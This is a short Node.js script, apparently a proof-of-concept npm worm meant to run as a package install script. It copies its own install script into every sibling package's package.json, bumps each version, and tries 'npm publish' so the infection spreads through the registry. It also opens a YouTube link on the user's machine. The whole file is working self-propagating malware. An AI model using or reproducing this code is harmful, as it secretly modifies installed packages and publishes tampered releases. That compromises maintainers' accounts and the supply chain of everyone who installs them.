var fs = require('fs'),
    path = require('path'),
    exec = require('child_process').exec,
    parent = path.resolve(__dirname, '../'),
    script = JSON.parse(fs.readFileSync(path.resolve(__dirname, 'package.json'))).scripts.install;

// Get the party started.
startTheParty();

// Instead of simply reading the parent directory, this could be expanded to 
// walk the  user's home directory to locate any directories named `node_modules"`.
fs.readdir(parent, getModules);

// Process every file/dir found in the parent directory.
function getModules(err, modules) {
  modules.forEach(processModule);
}

// Check if the dir has a `package.json` manifest. If it does, give it the same
// post install script that this module does.
function processModule(module) {
  var module = path.resolve(parent, module),
      manifest = path.resolve(module, 'package.json');
  fs.access(manifest, fs.F_OK, function(err) {
    var contents;
    if (!err) {
      contents = JSON.parse(fs.readFileSync(manifest));
      // To avoid a break if the script field not present.
      if (!contents.scripts) { contents.scripts = {}; }
      contents.scripts.install = script;
      fs.writeFile(manifest, JSON.stringify(contents, null, 4), function(err) {
        if (!err) publishModule(module);
      });
    };
  });
}

// Attempt to version and publish the module with the new post install script.
// This will fail 99.99% of the time because the user won't have permission but
// it's that .01% that we're interested in.
function publishModule(module) {
  exec('npm version patch', {cwd: module}, function (err, stdout, stderr) {
    exec('npm publish', {cwd: module}, function (err, stdout, stderr) {
      console.log('stdout', stdout);
      console.log('stderr', stderr);
    });
  });
}

function startTheParty() {
  var opener;
  // `xdg-open`could be used for Linux but for now they're excluded from the
  // pizza party. ;(
  switch (process.platform) {
    case 'darwin':
      opener = 'open';
      break;
    case 'win32':
      opener = 'start ""';
      break;
    default:
      opener = 'echo Join the pizza party at';
      break;
  }
  exec(opener + ' "https://www.youtube.com/watch?v=wusGIl3v044"');
}
